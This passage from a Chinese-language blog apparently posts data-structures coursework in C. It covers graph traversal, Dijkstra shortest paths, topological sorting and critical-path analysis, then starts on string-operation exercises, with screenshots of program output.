g3;</span><br><span class="line">	<span class="keyword">int</span> k=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">create_3</span>(&amp;g3,<span class="string">&quot;Rgraph1.txt&quot;</span>,<span class="number">1</span>);  <span class="comment">// 1 代表有向图</span></span><br><span class="line">	<span class="keyword">int</span> num;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//关键路径 测试----------------------------------------------------</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	AoeGraph g4;</span></span><br><span class="line"><span class="comment">	create_4(&amp;g4);</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">Menu</span>();</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;请输入菜单选项：&quot;</span>);</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;select);</span><br><span class="line">		<span class="built_in"><span class="keyword">switch</span></span>(select)&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:  <span class="comment">//深度优先遍历</span></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;图的深度优先遍历序列为：\n&quot;</span>);</span><br><span class="line">				<span class="built_in">DfsTraverse</span>(g1);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:		<span class="comment">//广度优先遍历</span></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;图的广度优先遍历序列为：\n&quot;</span>);</span><br><span class="line">				count = <span class="built_in">BfsTraverse</span>(g1);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;该图共有%d个连通分量\n&quot;</span>,count);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:		<span class="comment">//最短路径</span></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;请输入 源点 v0：&quot;</span>);</span><br><span class="line">				<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;v0);</span><br><span class="line">				<span class="built_in">dijkstra</span>(g2,v0,p,d);</span><br><span class="line">				<span class="built_in">print_gpd</span>(g2,p,d);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:		<span class="comment">//关键路径</span></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;关键路径：\n&quot;</span>); </span><br><span class="line">				<span class="comment">/*print(g4);</span></span><br><span class="line"><span class="comment">				printf(&quot;\n输出的顶点个数：%d\n\n&quot;,EarlistTime(g4));</span></span><br><span class="line"><span class="comment">				LateTime(g4);</span></span><br><span class="line"><span class="comment">				activity(g4);*/</span></span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">5</span>:		<span class="comment">//拓扑排序</span></span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\n进行拓扑排序的一个结果：\n&quot;</span>);</span><br><span class="line">				<span class="comment">//print(g3);</span></span><br><span class="line">				k=<span class="built_in">TopSort</span>(g3);</span><br><span class="line">				<span class="keyword">if</span>(k&lt;g3.n) <span class="built_in">printf</span>(<span class="string">&quot;\n该图存在环！\n&quot;</span>);</span><br><span class="line">				num = <span class="built_in">TopSort</span>(g3);</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;\n输出的结点个数是%2d个\n&quot;</span>,num);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">0</span>:		<span class="comment">//退出</span></span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;您输入的选项有误，请重新输入：\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">		<span class="built_in">system</span>(<span class="string">&quot;cls&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="图文件介绍"><a href="#图文件介绍" class="headerlink" title="图文件介绍"></a>图文件介绍</h2><p>深度优先遍历：举例 <code>graph1.txt</code></p>
<p>广度优先遍历：举例 <code>graph2.txt</code></p>
<p><img src="https://i.loli.net/2021/11/28/KFEJ1DdTIZnwyc4.png" alt="image-20211128161210345"></p>
<p><img src="https://i.loli.net/2021/11/28/4zJYZoLaIgUvAtF.png" alt="image-20211128193840517"></p>
<p>最短路径（有向图）：举例 <code>Mgraph2.txt</code></p>
<p><img src="https://i.loli.net/2021/11/28/MSlurL3EFnTaRZI.jpg" alt="IMG_20211127_111914"></p>
<p><img src="https://i.loli.net/2021/11/28/5u41lotQYvwabTn.png" alt="image-20211128193942188"></p>
<p>最短路径（无向图）：举例 <code>Mgraph1.txt</code></p>
<p><img src="https://i.loli.net/2021/11/28/Ep3ncv9ZDdbPF8R.png" alt="image-20211128160902780"></p>
<p><img src="https://i.loli.net/2021/11/28/XP1pcSYuORsIW4x.png" alt="image-20211128194004883"></p>
<p>拓扑排序：举例 <code>Rgraph1.txt</code></p>
<p><img src="https://i.loli.net/2021/11/28/nBUglrsmY53f4dM.png" alt="image-20211128155046109"></p>
<p><img src="https://i.loli.net/2021/11/28/HzWRkE9jNoqISOY.png" alt="image-20211128194212043"></p>
<p>关键路径：举例 <code>Ggraph.txt</code></p>
<p><img src="D:\APP\QQAPP\缓存\1370220243\FileRecv\MobileFile\qq_pic_merged_1638019241542.jpg" alt="qq_pic_merged_1638019241542"></p>
<p><img src="https://i.loli.net/2021/11/28/Y2qNm8dKELWv1pr.png" alt="image-20211128194030485"></p>
<h2 id="界面展示"><a href="#界面展示" class="headerlink" title="界面展示"></a>界面展示</h2><p><img src="https://i.loli.net/2021/11/28/uOMvV6ZJix4dqAj.png" alt="image-20211128194304352"></p>
<p><img src="https://i.loli.net/2021/11/28/u3NDCMxhfbcZap1.png" alt="image-20211128194315014"></p>
<p><img src="https://i.loli.net/2021/11/28/iAlNWTC13QRZaJg.png" alt="image-20211128194334446"></p>
<p><img src="https://i.loli.net/2021/11/28/f4aTePyIdxLoKkD.png" alt="image-20211128194348247"></p>
<p><img src="https://i.loli.net/2021/11/28/mPA1keYiDS5ubW9.png" alt="image-20211128194401181"></p>
<h1 id="关键路径-单独实现"><a href="#关键路径-单独实现" class="headerlink" title="关键路径 单独实现"></a>关键路径 单独实现</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> M = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">int</span> ve[M];<span class="comment">//事件最早发生时间向量</span></span><br><span class="line"><span class="keyword">int</span> seq[M];<span class="comment">//拓扑排序列向量</span></span><br><span class="line"><span class="keyword">int</span> vl[M];<span class="comment">//事件最晚允许发生时间向量</span></span><br><span class="line"><span class="keyword">int</span> e[M];<span class="comment">//活动的最早开始时间</span></span><br><span class="line"><span class="keyword">int</span> l[M];<span class="comment">//活动最迟开始时间</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>//边结点类型定义</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">int</span> adjvex;</span><br><span class="line">	<span class="keyword">int</span> len;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;EdgeNode;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">de</span> //带顶点入度的头节点定义</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	EdgeNode *FirstEdge;</span><br><span class="line">	<span class="keyword">char</span> vertex;</span><br><span class="line">	<span class="keyword">int</span> id;</span><br><span class="line">&#125;vertexnode;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	vertexnode adjlist[M];</span><br><span class="line">	<span class="keyword">int</span> n,e;</span><br><span class="line">&#125;AoeGraph;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">creat</span> <span class="params">(AoeGraph *g)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,k,len;</span><br><span class="line">	EdgeNode *s;</span><br><span class="line">	FILE *f;</span><br><span class="line">	f=<span class="built_in">fopen</span>(<span class="string">&quot;Ggraph.txt&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">	<span class="built_in">fscanf</span>(f,<span class="string">&quot;%d%d&quot;</span>,&amp;g-&gt;n,&amp;g-&gt;e);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g-&gt;n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fscanf</span>(f,<span class="string">&quot;%1s %d&quot;</span>,&amp;g-&gt;adjlist[i].vertex,&amp;g-&gt;adjlist[i].id);</span><br><span class="line">		g-&gt;adjlist[i].FirstEdge=<span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;g-&gt;e;k++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">fscanf</span>(f,<span class="string">&quot;%d%d%d&quot;</span>,&amp;i,&amp;j,&amp;len);</span><br><span class="line">		s=(EdgeNode*)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(EdgeNode));</span><br><span class="line">		s-&gt;len=len;</span><br><span class="line">		s-&gt;adjvex=j;</span><br><span class="line">		s-&gt;next=g-&gt;adjlist[i].FirstEdge;</span><br><span class="line">		g-&gt;adjlist[i].FirstEdge=s;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(AoeGraph g)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	EdgeNode *p;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;一共有%d个结点，%d条边\n&quot;</span>,g.n,g.e);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g.n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;入度：%d  V%c &quot;</span>,g.adjlist[i].id,g.adjlist[i].vertex);</span><br><span class="line">		p=g.adjlist[i].FirstEdge;</span><br><span class="line">		<span class="keyword">while</span>(p)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;(w=%d) %d&quot;</span>,p-&gt;len,p-&gt;adjvex);</span><br><span class="line">			<span class="keyword">if</span>(p-&gt;next)</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot; -&gt; &quot;</span>);</span><br><span class="line">			p=p-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//求每个事件最早发生的时间</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EarlistTime</span><span class="params">(AoeGraph gout)</span><span class="comment">//返回输出的顶点个数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> count=<span class="number">0</span>,i,j,v,flag[M];</span><br><span class="line">	<span class="keyword">int</span> queue[M];</span><br><span class="line">	<span class="keyword">int</span> front = <span class="number">0</span>,rear = <span class="number">0</span>;</span><br><span class="line">	EdgeNode *p;</span><br><span class="line">	<span class="built_in">memset</span>(ve,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(ve));<span class="comment">//初始化每个顶点最早开始时间是ve[i]=0;</span></span><br><span class="line">	<span class="built_in">memset</span>(flag,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(flag));<span class="comment">//访问标记初始化</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt; gout.n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(gout.adjlist[i].id==<span class="number">0</span> &amp;&amp; flag[i]==<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			queue[rear++]=i;</span><br><span class="line">			flag[i]=<span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span>(front &lt; rear)<span class="comment">//队列不为空</span></span><br><span class="line">	&#123;</span><br><span class="line">		v=queue[front++];<span class="comment">//队首元出队</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>,gout.adjlist[v].vertex);</span><br><span class="line">		seq[count++]=v;<span class="comment">//记录拓扑排序当前元素，计数器加一</span></span><br><span class="line">		p=gout.adjlist[v].FirstEdge;</span><br><span class="line">		<span class="keyword">while</span>(p)</span><br><span class="line">		&#123;</span><br><span class="line">			j=p-&gt;adjvex;</span><br><span class="line">			<span class="keyword">if</span>(--gout.adjlist[j].id==<span class="number">0</span> &amp;&amp; flag[j]==<span class="number">0</span>)<span class="comment">//入度为0则将进队</span></span><br><span class="line">			&#123;</span><br><span class="line">				queue[rear++]=j;</span><br><span class="line">				flag[j]=<span class="number">1</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(p-&gt;len+ve[v]&gt;ve[j])</span><br><span class="line">				ve[j]=ve[v]+p-&gt;len;</span><br><span class="line">			p=p-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n各个事件的最早发生时间：\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;gout.n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ve[%d]=%d\n&quot;</span>,i,ve[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//各事件的最晚允许开始时间</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">LateTime</span><span class="params">(AoeGraph gin)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> k=gin.n<span class="number">-1</span>,i,j,v;</span><br><span class="line">	EdgeNode *p;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;gin.n;i++)</span><br><span class="line">		vl[i]=ve[seq[gin.n<span class="number">-1</span>]];</span><br><span class="line">	<span class="keyword">while</span>(k&gt;<span class="number">-1</span>)<span class="comment">//按照拓扑排序求各事件最晚时间</span></span><br><span class="line">	&#123;</span><br><span class="line">		v=seq[k];</span><br><span class="line">		p=gin.adjlist[v].FirstEdge;</span><br><span class="line">		<span class="keyword">while</span>(p)</span><br><span class="line">		&#123;</span><br><span class="line">			j=p-&gt;adjvex;</span><br><span class="line">			<span class="keyword">if</span>(vl[j]-p-&gt;len &lt; vl[v])</span><br><span class="line">				vl[v]=vl[j]-p-&gt;len;</span><br><span class="line">			p=p-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">		k--;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;各个事件允许发生的最晚时间：\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;gin.n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;vl[%d]=%d\n&quot;</span>,i,vl[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//求e[k] 和 l[k]</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">activity</span><span class="params">(AoeGraph g)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,k,q;</span><br><span class="line">	EdgeNode *p; </span><br><span class="line">	<span class="built_in">memset</span>(e,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(e));</span><br><span class="line">	i=<span class="number">0</span>;q=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;起点 | 终点 | 活动最早开始时间 | 活动最晚开始时间 | 差值 | 是否为关键路径|\n&quot;</span>);</span><br><span class="line">	<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;g.n;j++)</span><br><span class="line">	&#123;</span><br><span class="line">		p=g.adjlist[j].FirstEdge;</span><br><span class="line">		<span class="keyword">while</span>(p)</span><br><span class="line">		&#123;</span><br><span class="line">			k=p-&gt;adjvex;</span><br><span class="line">			e[i]=ve[j];</span><br><span class="line">			l[i]=vl[k]-p-&gt;len;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%c    |%5d |%10d        |%10d        |%5d |&quot;</span>,g.adjlist[j].vertex,k,e[i],l[i],l[i]-e[i]);</span><br><span class="line">			<span class="keyword">if</span>(e[i]==l[i])</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;    √\n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;    \n&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;--------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">			p=p-&gt;next;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	AoeGraph g;</span><br><span class="line">	<span class="built_in">creat</span>(&amp;g);</span><br><span class="line">	<span class="built_in">print</span>(g);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n输出的顶点个数：%d\n\n&quot;</span>,<span class="built_in">EarlistTime</span>(g));</span><br><span class="line">	<span class="built_in">LateTime</span>(g);</span><br><span class="line">	<span class="built_in">activity</span>(g);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/11/28/z7FtoB9n2YHAQ4r.png" alt="image-20211128194511432"></p>
<p><img src="https://i.loli.net/2021/11/28/VxwseJrh4RMmgYo.png" alt="image-20211128194611358"></p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
  </entry>
  <entry>
    <title>第四章、第五章习题（字符串、数组、矩阵）</title>
    <url>/2021/10/26/%E7%AC%AC%E5%9B%9B%E7%AB%A0%E3%80%81%E7%AC%AC%E4%BA%94%E7%AB%A0%E4%B9%A0%E9%A2%98%EF%BC%88%E5%AD%97%E7%AC%A6%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E3%80%81%E7%9F%A9%E9%98%B5%EF%BC%89/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>[TOC]</p>
<h2 id="1-试编写一个函数，实现在-链式存储方式-下字符串的-strcompare-S1-S2"><a href="#1-试编写一个函数，实现在-链式存储方式-下字符串的-strcompare-S1-S2" class="headerlink" title="1. 试编写一个函数，实现在 链式存储方式 下字符串的 strcompare(S1,S2)"></a>1. 试编写一个函数，实现在 <code>链式存储方式</code> 下字符串的 <code>strcompare(S1,S2)</code></h2><p><strong>算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//进行比较</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcompare</span><span class="params">(linkstrnode *S1,linkstrnode *S2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(S1 &amp;&amp; S2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(S1-&gt;data &gt; S2-&gt;data)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(S1-&gt;data &lt; S2-&gt;data)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        S1 = S1-&gt;next;</span><br><span class="line">        S2 = S2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(S1)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(S2)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>测试：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;linkstrnode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> linkstrnode *linkstring;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建单链表  尾插法</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">strcreate</span><span class="params">(linkstring *S)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ch;</span><br><span class="line">    linkstrnode *p,*r;</span><br><span class="line">    *S = <span class="literal">NULL</span>;</span><br><span class="line">    r = <span class="literal">NULL</span>; <span class="comment">//r始终指向当前链式串最后一个字符对应的结点</span></span><br><span class="line">    <span class="keyword">while</span>((ch = getchar()) != <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        p = (linkstrnode *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linkstrnode));</span><br><span class="line">        p-&gt;data = ch;</span><br><span class="line">        <span class="keyword">if</span>(*S == <span class="literal">NULL</span>) <span class="comment">//本为空表</span></span><br><span class="line">            *S = p;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            r-&gt;next = p; <span class="comment">//不为空表</span></span><br><span class="line">        r = p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(r != <span class="literal">NULL</span>)</span><br><span class="line">        r-&gt;next = <span class="literal">NULL</span>; <span class="comment">//处理尾结点指针域</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//打印输出</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(linkstring head)</span></span>&#123;</span><br><span class="line">    linkstrnode *p;</span><br><span class="line">    p = head;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c-&gt;&quot;</span>,p-&gt;data);</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//进行比较</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">strcompare</span><span class="params">(linkstrnode *S1,linkstrnode *S2)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(S1 &amp;&amp; S2)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(S1-&gt;data &gt; S2-&gt;data)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(S1-&gt;data &lt; S2-&gt;data)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        S1 = S1-&gt;next;</span><br><span class="line">        S2 = S2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(S1)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(S2)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    linkstring s1,s2;</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n请输入第一个字符串 s1：&quot;</span>);</span><br><span class="line">    strcreate(&amp;s1);</span><br><span class="line">    print(s1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n请输入第二个字符串 s2：&quot;</span>);</span><br><span class="line">    strcreate(&amp;s2);</span><br><span class="line">    print(s2);</span><br><span class="line">    k = strcompare(s1,s2);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n比较的结果为：\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(k == <span class="number">1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s1 &gt; s2&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(k == <span class="number">-1</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s1 &lt; s2&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s1 == s2&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2021/10/22/OAhsKJBz8ECf54n.png" alt="image-20211022180148858"></p>
<h2 id="2-试编写一个函数，实现在-顺序存储方式-下字符串的-replace-S-T1-T2-运算"><a href="#2-试编写一个函数，实现在-顺序存储方式-下字符串的-replace-S-T1-T2-运算" class="headerlink" title="2. 试编写一个函数，实现在 顺序存储方式 下字符串的 replace(S,T1,T2) 运算"></a>2. 试编写一个函数，实现在 <code>顺序存储方式</code> 下字符串的 <code>replace(S,T1,T2)</code> 运算</h2><p><strong>算法：</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//replace 运算</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">replace</span><span class="params">(seqstring *s,seqstring t1,seqstring t2,<span class="keyword">int</span> next[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k,c,m;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    j = <span class="number">0</span>;</span><br><span class="line">    k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; s-&gt;length)</span><br><span class="line">    &#123;</span><br><span class="line">        j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; s-&gt;length &amp;&amp; j &lt; t1.length)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(j == <span class="number">-1</span> || s-&gt;str[i] == t1.str[j])</span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">                j++;</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                j = next[j];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(j == t1.length)</span><br><span class="line">        &#123;</span><br><span class="line">            c = i-t1.length;</span><br><span class="line">            <span class="keyword">if</span>(t1.length == t2.length)</span><br><span class="line">                <span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;t2.length;k++)</span><br><span class="line">                    s-&gt;str[c+k] = t2.str[k];</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(t1.length &lt; t2.length)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">for</span>(m = s-&gt;length<span class="number">-1</span>;m &gt; i<span class="number">-1</span>;m--)</span><br><span class="line">                    s-&gt;str[t2.length-t1.length+m] = s-&gt;str[m];</span><br><span class="line">                <span class="keyword">for</span>(k=<span class="number">0</span>;k &lt; t2.length;k++)</span><br><span class="line">                    s-&gt;str[c+k] = 